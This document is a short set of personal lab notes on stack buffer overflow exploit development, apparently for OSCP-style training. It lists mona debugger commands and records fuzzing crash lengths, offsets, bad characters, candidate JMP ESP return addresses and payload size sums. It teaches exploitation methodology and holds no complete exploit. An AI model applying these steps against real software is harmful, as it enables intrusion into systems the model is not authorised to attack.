!mona commands:

1. !mona config -set workingfolder c:\mona\%p

2. !mona findmsp -distance 600

3. !mona bytearray -b "\x00"

4. !mona compare -f C:\mona\oscp\bytearray.bin -a <address>

5. !mona bytearray -b "\x00\xbadchar"

6. !mona jmp -r esp -cpb "\x00"

- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
see: BOF tutorial by hacking article

at 2100 byte --> crashed   

arbitary payload made --> 2100 byte

offset --> 2026

shellcode --> 351 byte


Address	          Status                   BadChars
0x0182fa30  Corruption after 6 bytes   00 a9 aa cd ce d4 d5
				       => \x00\xa9\xaa\xcd\xce\xd4\xd5
				        => \x00\xa9\xcd\xd4
					(as bad char tends to currupt next char as
					 well that doesn't mean that adjucent char
					  is corrupted)  -> aa ce d5 are victims
 Type	    Location
 normal      Stack


ret addr: 

0x625011af  => LSB --> \xaf\x11\x50\x62
0x625011bb  => LSB --> \xbb\x11\x50\x62
0x625011C7  => LSB --> \xc7\x11\x50\x62
0x625011d3  => LSB --> \xd3\x11\x50\x62
0x625011df  => LSB --> \xdf\x11\x50\x62
0x625011eb  => LSB --> \xeb\x11\x50\x62
0x625011f7  => LSB --> \xf7\x11\x50\x62
0x62501203  => LSB --> \x03\x12\x50\x62
0x62501205  => LSB --> \x05\x12\x50\x62

-----------------------------
Eg:

payload = 

prefix + 1978 + 4 + 16 + 351 ---> 2349 + prefix --> 2349 + 10 --> 2359  (<= 2400)

______________________________________________________________________


at 2100 byte --> crashed

payload made --> 2100 byte  

-----> Technically, it would also work, to find the offset but if it was taken, 
       making payload would be difficult.

_____________
Eg:

kali@reveng ~/T/B/OVERFLOW2> msf-pattern_offset -l 2000 -q 76413176
[*] Exact match at offset 1274

kali@reveng ~/T/B/OVERFLOW2> msf-pattern_offset -l 2100 -q 76413176
[*] Exact match at offset 1274
------------

offset --> 2026  => min. byte to overflow buffer/stack

crashed at --> 2100 => offset present b/w 2000 and 2100 according to fuzzing script




